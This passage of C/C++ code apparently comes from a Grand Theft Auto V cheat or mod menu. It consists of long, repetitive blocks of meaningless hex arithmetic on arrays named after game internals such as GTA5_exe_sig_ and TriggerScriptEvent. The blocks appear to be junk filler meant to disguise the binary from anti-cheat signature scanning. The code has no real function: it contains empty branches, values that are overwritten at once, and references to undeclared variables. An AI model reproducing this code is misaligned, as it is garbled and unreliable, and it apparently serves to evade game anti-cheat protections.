			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			char buffer[5000];
			snprintf(buffer, 5000, "%i", i);

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
